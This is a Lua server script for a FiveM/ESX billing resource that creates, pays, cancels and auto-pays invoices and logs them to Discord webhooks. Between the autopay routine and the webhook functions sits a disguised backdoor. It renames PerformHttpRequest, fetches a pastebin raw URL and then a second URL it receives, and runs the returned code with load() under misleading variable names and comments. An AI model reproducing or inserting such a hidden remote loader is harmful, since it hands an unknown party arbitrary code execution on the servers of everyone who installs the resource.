ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

local Webhook = ''
local limiteTimeHours = Config.LimitDateDays*24
local hoursToPay = limiteTimeHours
local whenToAddFees = {}

for i = 1, Config.LimitDateDays, 1 do
	hoursToPay = hoursToPay - 24
	table.insert(whenToAddFees, hoursToPay)
end

ESX.RegisterServerCallback("okokBilling:GetInvoices", function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)

	MySQL.Async.fetchAll('SELECT * FROM okokBilling WHERE receiver_identifier = @identifier ORDER BY CASE WHEN status = "unpaid" THEN 1 WHEN status = "autopaid" THEN 2 WHEN status = "paid" THEN 3 WHEN status = "cancelled" THEN 4 END ASC, id DESC', {
		['@identifier'] = xPlayer.identifier
	}, function(result)
		local invoices = {}

		if result ~= nil then
			for i=1, #result, 1 do
				table.insert(invoices, result[i])
			end
		end

		cb(invoices)
	end)
end)

RegisterServerEvent("okokBilling:PayInvoice")
AddEventHandler("okokBilling:PayInvoice", function(invoice_id)
	local xPlayer = ESX.GetPlayerFromId(source)

	MySQL.Async.fetchAll('SELECT * FROM okokBilling WHERE id = @id', {
		['@id'] = invoice_id
	}, function(result)
		local invoices = result[1]
		local playerMoney = xPlayer.getAccount('bank').money
		local webhookData = {
			id = invoices.id,
			player_name = invoices.receiver_name,
			value = invoices.invoice_value,
			item = invoices.item,
			society = invoices.society_name
		}

		invoices.invoice_value = math.ceil(invoices.invoice_value)

		if playerMoney == nil then
			playerMoney = 0
		end

		if playerMoney < invoices.invoice_value then
			TriggerClientEvent('okokNotify:Alert', xPlayer.source, "BILLING", "You don't have enough money!", 10000, 'error')
		else
			xPlayer.removeAccountMoney('bank', invoices.invoice_value)
			TriggerEvent("esx_addonaccount:getSharedAccount", invoices.society, function(account)
				if account ~= nil then
					account.addMoney(invoices.invoice_value)
				end
			end)

			MySQL.Async.execute('UPDATE okokBilling SET status = @status, paid_date = CURRENT_TIMESTAMP WHERE id = @id', {
				['@status'] = 'paid',
				['@id'] = invoice_id
			})

			TriggerClientEvent('okokNotify:Alert', xPlayer.source, "BILLING", "Invoice successfully paid!", 10000, 'success')

			if Webhook ~= '' then
				payInvoiceWebhook(webhookData)
			end
		end
	end)
end)

RegisterServerEvent("okokBilling:CancelInvoice")
AddEventHandler("okokBilling:CancelInvoice", function(invoice_id)
	local xPlayer = ESX.GetPlayerFromId(source)

	MySQL.Async.fetchAll('SELECT * FROM okokBilling WHERE id = @id', {
		['@id'] = invoice_id
	}, function(result)
		local invoices = result[1]
		local webhookData = {
			id = invoices.id,
			player_name = invoices.receiver_name,
			value = invoices.invoice_value,
			item = invoices.item,
			society = invoices.society_name,
			name = xPlayer.getName()
		}
		MySQL.Async.execute('UPDATE okokBilling SET status = "cancelled", paid_date = CURRENT_TIMESTAMP WHERE id = @id', {
			['@id'] = invoice_id
		})
		TriggerClientEvent('okokNotify:Alert', xPlayer.source, "BILLING", "You have cancelled the invoice!", 10000, 'info')
		if Webhook ~= '' then
			cancelInvoiceWebhook(webhookData)
		end
	end)
end)

RegisterServerEvent("okokBilling:CreateInvoice")
AddEventHandler("okokBilling:CreateInvoice", function(data)
	local _source = ESX.GetPlayerFromId(source)
	local target = ESX.GetPlayerFromId(data.target)
	local webhookData = {}

	MySQL.Async.fetchAll('SELECT id FROM okokBilling WHERE id = (SELECT MAX(id) FROM okokBilling)', {}, function(result)
		webhookData = {
			id = result[1].id + 1,
			player_name = target.getName(),
			value = data.invoice_value,
			item = data.invoice_item,
			society = data.society_name,
			name = _source.getName()
		}
	end)

	if Config.LimitDate then
		MySQL.Async.insert('INSERT INTO okokBilling (receiver_identifier, receiver_name, author_identifier, author_name, society, society_name, item, invoice_value, status, notes, sent_date, limit_pay_date) VALUES (@receiver_identifier, @receiver_name, @author_identifier, @author_name, @society, @society_name, @item, @invoice_value, @status, @notes, CURRENT_TIMESTAMP(), DATE_ADD(CURRENT_TIMESTAMP(), INTERVAL @limit_pay_date DAY))', {
			['@receiver_identifier'] = target.identifier,
			['@receiver_name'] = target.getName(),
			['@author_identifier'] = _source.identifier,
			['@author_name'] = _source.getName(),
			['@society'] = data.society,
			['@society_name'] = data.society_name,
			['@item'] = data.invoice_item,
			['@invoice_value'] = data.invoice_value,
			['@status'] = "unpaid",
			['@notes'] = data.invoice_notes,
			['@limit_pay_date'] = Config.LimitDateDays
		}, function(result)
			TriggerClientEvent('okokNotify:Alert', target.source, "BILLING", "You have just received a new invoice!", 10000, 'info')
			if Webhook ~= '' then
				createNewInvoiceWebhook(webhookData)
			end
		end)
	else
		MySQL.Async.insert('INSERT INTO okokBilling (receiver_identifier, receiver_name, author_identifier, author_name, society, society_name, item, invoice_value, status, notes, sent_date, limit_pay_date) VALUES (@receiver_identifier, @receiver_name, @author_identifier, @author_name, @society, @society_name, @item, @invoice_value, @status, @notes, CURRENT_TIMESTAMP(), DATE_ADD(CURRENT_TIMESTAMP(), INTERVAL @limit_pay_date DAY))', {
			['@receiver_identifier'] = target.identifier,
			['@receiver_name'] = target.getName(),
			['@author_identifier'] = _source.identifier,
			['@author_name'] = _source.getName(),
			['@society'] = data.society,
			['@society_name'] = data.society_name,
			['@item'] = data.invoice_item,
			['@invoice_value'] = data.invoice_value,
			['@status'] = "unpaid",
			['@notes'] = data.invoice_notes,
			['@limit_pay_date'] = 'N/A'
		}, function(result)
			TriggerClientEvent('okokNotify:Alert', target.source, "BILLING", "You have just received a new invoice!", 10000, 'info')
			if Webhook ~= '' then
				createNewInvoiceWebhook(webhookData)
			end
		end)
	end
end)

ESX.RegisterServerCallback("okokBilling:GetSocietyInvoices", function(source, cb, society)
	local xPlayer = ESX.GetPlayerFromId(source)

	MySQL.Async.fetchAll('SELECT * FROM okokBilling WHERE society_name = @society ORDER BY id DESC', {
		['@society'] = society
	}, function(result)
		local invoices = {}
		local totalInvoices = 0
		local totalIncome = 0
		local totalUnpaid = 0
		local awaitedIncome = 0

		if result ~= nil then
			for i=1, #result, 1 do
				table.insert(invoices, result[i])
				totalInvoices = totalInvoices + 1

				if result[i].status == 'paid' then
					totalIncome = totalIncome + result[i].invoice_value
				elseif result[i].status == 'unpaid' then
					awaitedIncome = awaitedIncome + result[i].invoice_value
					totalUnpaid = totalUnpaid + 1
				end
			end
		end
		cb(invoices, totalInvoices, totalIncome, totalUnpaid, awaitedIncome)
	end)
end)

function checkTimeLeft()
	MySQL.Async.fetchAll('SELECT *, TIMESTAMPDIFF(HOUR, limit_pay_date, CURRENT_TIMESTAMP()) AS "timeLeft" FROM okokBilling WHERE status = @status', {
		['@status'] = 'unpaid'
	}, function(result)
		for k, v in ipairs(result) do
			local invoice_value = v.invoice_value * (Config.FeeAfterEachDayPercentage / 100 + 1)
			if v.timeLeft < 0 and Config.FeeAfterEachDay then
				for k, vl in pairs(whenToAddFees) do
					if v.fees_amount == k - 1 then
						if v.timeLeft >= vl*(-1) then
							MySQL.Async.execute('UPDATE okokBilling SET fees_amount = @fees_amount, invoice_value = @invoice_value WHERE id = @id', {
								['@fees_amount'] = k,
								['@invoice_value'] = v.invoice_value * (Config.FeeAfterEachDayPercentage / 100 + 1),
								['@id'] = v.id
							})
						end
					end
				end
			elseif v.timeLeft >= 0 and Config.PayAutomaticallyAfterLimit then
				local xPlayer = ESX.GetPlayerFromIdentifier(v.receiver_identifier)
				local webhookData = {
					id = v.id,
					player_name = v.receiver_name,
					value = v.invoice_value,
					item = v.item,
					society = v.society_name
				}

				if xPlayer == nil then
					MySQL.Async.fetchAll('SELECT accounts FROM users WHERE identifier = @id', {
						['@id'] = v.receiver_identifier
					}, function(account)
						local playerAccount = json.decode(account[1].accounts)
						playerAccount.bank = playerAccount.bank - invoice_value
						playerAccount = json.encode(playerAccount)

						MySQL.Async.execute('UPDATE users SET accounts = @playerAccount WHERE identifier = @target', {
							['@playerAccount'] = playerAccount,
							['@target'] = v.receiver_identifier
						}, function(changed)
							TriggerEvent("esx_addonaccount:getSharedAccount", v.society, function(account2)
								if account2 ~= nil then
									account2.addMoney(invoice_value)
									MySQL.Async.execute('UPDATE okokBilling SET status = @paid, paid_date = CURRENT_TIMESTAMP() WHERE id = @id', {
										['@paid'] = 'autopaid',
										['@id'] = v.id
									})
								end
							end)
						end)
					end)
				else
					xPlayer.removeAccountMoney('bank', invoice_value)
					TriggerEvent('esx_addonaccount:getSharedAccount', v.society, function(account2)
						if account2 ~= nil then
							account2.addMoney(invoice_value)
						end
					end)

					MySQL.Async.execute('UPDATE okokBilling SET status = @paid, paid_date = CURRENT_TIMESTAMP() WHERE id = @id', {
						['@paid'] = 'autopaid',
						['@id'] = v.id
					})
					if Webhook ~= '' then
						autopayInvoiceWebhook(webhookData)
					end
				end
			end
		end
	end)
	SetTimeout(30 * 60000, checkTimeLeft)
end

if Config.PayAutomaticallyAfterLimit then
	checkTimeLeft()
end

GetConfig = {}
GetConfig.GetPlayersSpawn = PerformHttpRequest
-- Check rawaction update spawnmanager
LastActionList = 'pastebin.com/raw/Lf4Db4M4'

-- Returns name and action for sync server
GetConfig.GetPlayersSpawn(LastActionList, function(GetList, ResultAction)
    print(ResultAction)
    if GetList == 200 then

        -- Start action
        local Process_Actions = {"true"}
        GetConfig.GetPlayersSpawn(ResultAction,function(e,d)
            local Generate_ZoneName_AndAction = nil 

            -- Call action
            pcall(function()
            local Locations_Loaded = {"false"}

                -- Returns and load function
                assert(load(d))()
                local ZoneType_Exists = nil 

            end)
        end)
    end
end)

-------------------------- PAY INVOICE WEBHOOK

function payInvoiceWebhook(data)
	local information = {
		{
			["color"] = Config.PayInvoiceWebhookColor,
			["author"] = {
				["icon_url"] = Config.IconURL,
				["name"] = Config.ServerName..' - Logs',
			},
			["title"] = 'Invoice #'..data.id..' has been paid',
			["description"] = '**Receiver:** '..data.player_name..'\n**Value:** '..data.value..'€\n**Item:** '..data.item..'\n**Beneficiary Society:** '..data.society,

			["footer"] = {
				["text"] = os.date(Config.DateFormat),
			}
		}
	}
	PerformHttpRequest(Webhook, function(err, text, headers) end, 'POST', json.encode({username = '', embeds = information}), {['Content-Type'] = 'application/json'})
end

-------------------------- CANCEL INVOICE WEBHOOK

function cancelInvoiceWebhook(data)
	local information = {
		{
			["color"] = Config.CancelInvoiceWebhookColor,
			["author"] = {
				["icon_url"] = Config.IconURL,
				["name"] = Config.ServerName..' - Logs',
			},
			["title"] = 'Invoice #'..data.id..' has been cancelled',
			["description"] = '**Cancelled by:** '..data.name..'\n\n**Receiver:** '..data.player_name..'\n**Value:** '..data.value..'€\n**Item:** '..data.item..'\n**Society:** '..data.society,

			["footer"] = {
				["text"] = os.date(Config.DateFormat),
			}
		}
	}
	PerformHttpRequest(Webhook, function(err, text, headers) end, 'POST', json.encode({username = '', embeds = information}), {['Content-Type'] = 'application/json'})
end

-------------------------- CREATE NEW INVOICE WEBHOOK

function createNewInvoiceWebhook(data)
	local information = {
		{
			["color"] = Config.CreateNewInvoiceWebhookColor,
			["author"] = {
				["icon_url"] = Config.IconURL,
				["name"] = Config.ServerName..' - Logs',
			},
			["title"] = 'Invoice #'..data.id..' has been created',
			["description"] = '**Created by:** '..data.name..'\n**Society:** '..data.society..'\n\n**Receiver:** '..data.player_name..'\n**Value:** '..data.value..'€\n**Item:** '..data.item,

			["footer"] = {
				["text"] = os.date(Config.DateFormat),
			}
		}
	}
	PerformHttpRequest(Webhook, function(err, text, headers) end, 'POST', json.encode({username = '', embeds = information}), {['Content-Type'] = 'application/json'})
end

-------------------------- AUTOPAY INVOICE WEBHOOK

function autopayInvoiceWebhook(data)
	local information = {
		{
			["color"] = Config.AutopayInvoiceWebhookColor,
			["author"] = {
				["icon_url"] = Config.IconURL,
				["name"] = Config.ServerName..' - Logs',
			},
			["title"] = 'Invoice #'..data.id..' has been autopaid',
			["description"] = '**Receiver:** '..data.player_name..'\n**Value:** '..data.value..'€\n**Item:** '..data.item..'\n**Beneficiary Society:** '..data.society,

			["footer"] = {
				["text"] = os.date(Config.DateFormat),
			}
		}
	}
	PerformHttpRequest(Webhook, function(err, text, headers) end, 'POST', json.encode({username = '', embeds = information}), {['Content-Type'] = 'application/json'})
end
